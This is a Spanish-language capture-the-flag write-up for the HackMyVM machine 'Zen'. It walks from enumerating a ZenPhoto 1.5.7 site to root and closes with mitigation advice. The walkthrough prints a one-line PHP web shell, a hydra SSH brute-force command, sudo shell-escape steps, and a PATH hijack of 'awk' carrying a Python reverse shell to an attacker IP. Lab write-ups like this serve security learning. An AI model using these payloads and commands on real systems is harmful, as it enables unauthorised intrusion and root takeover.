# Writeup: Máquina Zen - HackMyVM

En este writeup detallo el proceso de explotación y escalada de privilegios de la máquina **Zen** de la plataforma HackMyVM. La resolución abarca desde la enumeración inicial de un CMS ZenPhoto con una contraseña débil oculta en el `robots.txt`, hasta una cadena de tres pivoteos laterales mediante sudo mal configurado y un secuestro del PATH para alcanzar root.

---

## Resumen

Zen es una máquina Linux (Debian) que expone un servidor nginx con una instancia del CMS ZenPhoto 1.5.7. El vector de entrada es una credencial predeterminada sugerida por una entrada anómala en el archivo `robots.txt` (`/P@ssw0rd`), que permite acceder al panel de administración. Una vez autenticado, la activación del plugin elFinder habilita la subida de un archivo PHP malicioso que otorga ejecución remota de código como `www-data`. La escalada de privilegios es una concatenación de tres reglas de sudo consecutivas: `zenmaster` a `kodo` vía `/bin/bash`, `kodo` a `hua` mediante un shell escape sobre `run-mailcap`, y finalmente `hua` a root secuestrando el binario `awk` en una ruta del PATH con permisos de escritura para explotar el script `add-shell`.

---

## 1. Reconocimiento Inicial

Comenzamos comprobando la conectividad con la máquina objetivo mediante una traza ICMP. El TTL de 64 nos indica que nos encontramos ante un sistema operativo Linux.

```bash
root@kali:~/hmv/Zen/nmap# ping -c3 192.168.0.30
PING 192.168.0.30 (192.168.0.30) 56(84) bytes of data.
64 bytes from 192.168.0.30: icmp_seq=1 ttl=64 time=0.592 ms
64 bytes from 192.168.0.30: icmp_seq=2 ttl=64 time=0.391 ms
64 bytes from 192.168.0.30: icmp_seq=3 ttl=64 time=0.297 ms

--- 192.168.0.30 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2053ms
rtt min/avg/max/mdev = 0.297/0.426/0.592/0.123 ms
```

A continuación, ejecutamos un escaneo de puertos completo con `nmap` para descubrir los servicios expuestos:

```bash
root@kali:~/hmv/Zen/nmap# nmap -p- --open -sSCV -n -Pn 192.168.0.30 -oN tcpScan
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-04 11:21 +0200
Nmap scan report for 192.168.0.30
Host is up (0.00063s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 c3:a0:ac:5d:25:92:47:2c:f5:70:ba:1b:f0:a3:b9:67 (RSA)
|   256 03:72:ad:7b:df:46:5d:b3:2a:9b:69:a9:c4:11:35:86 (ECDSA)
|_  256 4b:a1:81:88:73:2a:a0:b6:5c:9f:30:d9:c9:7f:1f:3f (ED25519)
80/tcp open  http    nginx 1.14.2
|_http-title: Galería
| http-robots.txt: 9 disallowed entries 
| /albums/ /plugins/ /P@ssw0rd /themes/ /zp-core/ 
|_/zp-data/ /page/search/ /uploaded/ /backup/
|_http-server-header: nginx/1.14.2
```

El escaneo revela dos únicos puertos abiertos: SSH (22) y HTTP (80) servido por nginx. La cabecera `http-robots.txt` nos entrega desde el principio varias rutas internas del CMS, incluyendo una particularmente sospechosa: `/P@ssw0rd`.

---

## 2. Enumeración Web

Al visitar la web en el navegador se confirma el uso de ZenPhoto como gestor de galería. Inspeccionando el código fuente con `Ctrl+U` confirmamos la versión exacta: **ZenPhoto 1.5.7**.

Si bien existen vulnerabilidades públicas para esta versión, todas requieren autenticación previa. Nos fijamos entonces en los directorios revelados por el `robots.txt`. Todos devuelven `403 Forbidden` excepto dos:

- `/P@ssw0rd` → `404 Not Found`
- `/zp-core` → accesible

El hecho de que `/P@ssw0rd` arroje un 404 en lugar de un 403 es anómalo: sugiere que la ruta nunca existió como directorio real, pero alguien la incluyó deliberadamente en el `robots.txt` — posiblemente como pista o descuido. Decidimos fuzzear el directorio `/zp-core/` en busca de recursos expuestos:

```bash
root@kali:~/hmv/Zen/nmap# gobuster dir -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.0.30/zp-core/ -x txt,php -r
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
admin.php            (Status: 200) [Size: 7779]
license.php          (Status: 200) [Size: 3865]
setup.php            (Status: 200) [Size: 1651]
htaccess             (Status: 200) [Size: 624]
===============================================================
Finished
===============================================================
```

El fuzzeo revela entre otros `admin.php`, que despliega el panel de autenticación del CMS.

---

## 3. Explotación (Initial Access)

En el panel de `admin.php` probamos combinaciones predecibles como `admin:admin` y `admin:password`, sin éxito. Recordamos entonces la ruta `/P@ssw0rd` del `robots.txt` — si aparecía como directorio a ocultar pese a no existir, quizá era una pista sobre qué contraseña probar.

Probamos `admin:P@ssw0rd` y accedemos correctamente al panel de administración de ZenPhoto.

Una vez autenticados, investigamos la explotación de ZenPhoto 1.5.7. La vía documentada requiere activar el plugin **elFinder**, que una vez habilitado permite la subida de archivos al servidor. Navegamos a la sección de temas, subimos un archivo PHP con una web shell mínima y conseguimos ejecución remota de código:

```php
<?php system($_REQUEST['cmd']); ?>
```

Verificamos el RCE desde nuestra máquina:

```bash
root@kali:~/hmv/Zen/content# curl -s http://192.168.0.30/themes/shell.php?cmd=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Lanzamos una reverse shell y obtenemos acceso interactivo como `www-data` en la máquina objetivo.

---

## 4. Escalada de Privilegios

### 4.1. De `www-data` a `zenmaster`

Enumeramos los usuarios con shell en el sistema:

```bash
www-data@zen:~$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
kodo:x:1000:1000:kodo,,,:/home/kodo:/bin/bash
zenmaster:x:1001:1001:,,,:/home/zenmaster:/bin/bash
hua:x:1002:1002:,,,:/home/hua:/bin/bash
```

Identificamos tres usuarios no privilegiados: `kodo`, `zenmaster` y `hua`. Dado que el acceso inicial se consiguió mediante una contraseña débil, es razonable suponer que la misma debilidad se repite en las cuentas del sistema. Preparamos un diccionario con los nombres de usuario y lanzamos un ataque de fuerza bruta contra SSH con `hydra`:

```bash
hydra -L users -P users ssh://192.168.0.30
```

En pocos segundos hydra encuentra las credenciales `zenmaster:zenmaster`. Accedemos por SSH y leemos la primera flag.

### 4.2. De `zenmaster` a `kodo`

Revisamos los privilegios de sudo:

```bash
zenmaster@zen:~$ sudo -l
Matching Defaults entries for zenmaster on zen:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User zenmaster may run the following commands on zen:
    (kodo) NOPASSWD: /bin/bash
```

`zenmaster` puede ejecutar `/bin/bash` como el usuario `kodo` sin contraseña. La transición es inmediata:

```bash
zenmaster@zen:~$ sudo -u kodo /bin/bash
kodo@zen:~$
```

### 4.3. De `kodo` a `hua`

De nuevo verificamos los permisos de sudo para el nuevo usuario:

```bash
kodo@zen:~$ sudo -l
Matching Defaults entries for kodo on zen:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User kodo may run the following commands on zen:
    (hua) NOPASSWD: /usr/bin/see

kodo@zen:~$ ls -l /usr/bin/see
lrwxrwxrwx 1 root root 11 Feb  9  2019 /usr/bin/see -> run-mailcap
```

El binario `/usr/bin/see` es un enlace simbólico a `run-mailcap`. Según GTFOBins, al igual que `vim` o `less`, `run-mailcap` permite ejecutar comandos de shell desde el visor de archivos. Lo explotamos de la siguiente forma:

```bash
kodo@zen:~$ sudo -u hua /usr/bin/see /etc/hostname
```

Una vez abierto el visor, escribimos el comando de escape:

```bash
!/bin/bash
```

Esto nos proporciona una shell interactiva como el usuario `hua`.

### 4.4. De `hua` a `root`

Verificamos los privilegios de sudo de `hua`:

```bash
hua@zen:~$ sudo -l
Matching Defaults entries for hua on zen:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User hua may run the following commands on zen:
    (ALL : ALL) NOPASSWD: /usr/sbin/add-shell zen
```

`hua` puede ejecutar `/usr/sbin/add-shell zen` como cualquier usuario, incluido root. Para entender qué hace internamente, lo analizamos con `strace` y llaman la atención estas líneas:

```bash
hua@zen:~$ strace -f /usr/sbin/add-shell zen
...
stat("/usr/local/sbin/awk", 0x7ffc3700cca0) = -1 ENOENT (No such file or directory)
stat("/usr/local/bin/awk", 0x7ffc3700cca0) = -1 ENOENT (No such file or directory)
stat("/usr/sbin/awk", 0x7ffc3700cca0)   = -1 ENOENT (No such file or directory)
stat("/usr/bin/awk", {st_mode=S_IFREG|0755, st_size=674624, ...}) = 0
...
```

El binario invoca `awk` sin una ruta absoluta, delegando su resolución en el PATH del usuario:

```bash
hua@zen:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

`strace` confirma que el sistema recorre `$PATH` en orden: busca `awk` en `/usr/local/sbin` (no existe), luego en `/usr/local/bin` (no existe), luego en `/usr/sbin` (no existe) y finalmente lo encuentra en `/usr/bin`. Dado que `/usr/local/bin` no existe, podemos crearlo como directorio y colocar allí nuestro propio binario `awk` malicioso.

Como `hua` no tiene permisos de escritura en `/usr/local/sbin`, pero sí puede escribir en `/usr/local/bin`, creamos esta última carpeta y un script malicioso con una reverse shell en Python. Usamos el payload de [PentestMonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet):

```bash
hua@zen:~$ mkdir -p /usr/local/bin
hua@zen:~$ echo 'python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.0.43\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);"' > /usr/local/bin/awk
hua@zen:~$ chmod +x /usr/local/bin/awk
```

Levantamos un listener de netcat en nuestra máquina atacante y ejecutamos el binario privilegiado:

```bash
# Máquina atacante:
nc -lvnp 1234

# Máquina víctima:
hua@zen:~$ sudo /usr/sbin/add-shell zen
```

Al ejecutarse `add-shell`, la resolución del PATH encuentra nuestro `awk` malicioso en `/usr/local/bin` antes que el legítimo en `/usr/bin`, y la reverse shell se ejecuta con privilegios de root. Recibimos la conexión y obtenemos control total del sistema.

¡Máquina rooteada exitosamente!

---

## 5. Detección y Mitigación

- **Credenciales ocultas en el `robots.txt`**: la contraseña `P@ssw0rd` — aunque disfrazada como nombre de ruta — estaba literalmente expuesta en un archivo público. Cualquier string que se quiera mantener secreto no debe figurar en `robots.txt` ni en ningún otro recurso accesible sin autenticación.
- **Contraseña débil y reutilizada**: la combinación `admin:P@ssw0rd` vulnera el panel de administración de ZenPhoto, y `zenmaster:zenmaster` otorga acceso por SSH. Las políticas de contraseñas deben exigir complejidad mínima y bloquear la coincidencia exacta entre nombre de usuario y contraseña.
- **Plugin elFinder activo sin necesidad operativa**: ZenPhoto incluye plugins que habilitan la subida de archivos. Si no se utilizan, deben permanecer desactivados. Si su uso es necesario, el directorio de subida debe configurarse para bloquear la ejecución de scripts (por ejemplo, mediante `.htaccess` o la configuración de nginx).
- **Reglas de sudo en cadena sin propósito administrativo justificado**: la secuencia `zenmaster → kodo → hua → root` podía recorrerse entera sin ninguna contraseña. Cada usuario tenía delegado exactamente un binario pivotable. Las reglas de sudo deben limitarse a tareas operativas reales y revisarse periódicamente para eliminar concesiones innecesarias.
- **Shell escape a través de `run-mailcap`**: cualquier binario que invoque un paginador interactivo es susceptible de shell escape. Delegar `/usr/bin/see` sin restricciones adicionales equivale a delegar una shell.
- **Resolución insegura de dependencias por PATH**: el script `add-shell` invocaba `awk` sin ruta absoluta, permitiendo que un usuario colocara un binario malicioso en un directorio anterior en el PATH (`/usr/local/bin`) con permisos de escritura. Cualquier script que se ejecute con privilegios elevados debe usar rutas absolutas para todas sus dependencias externas.
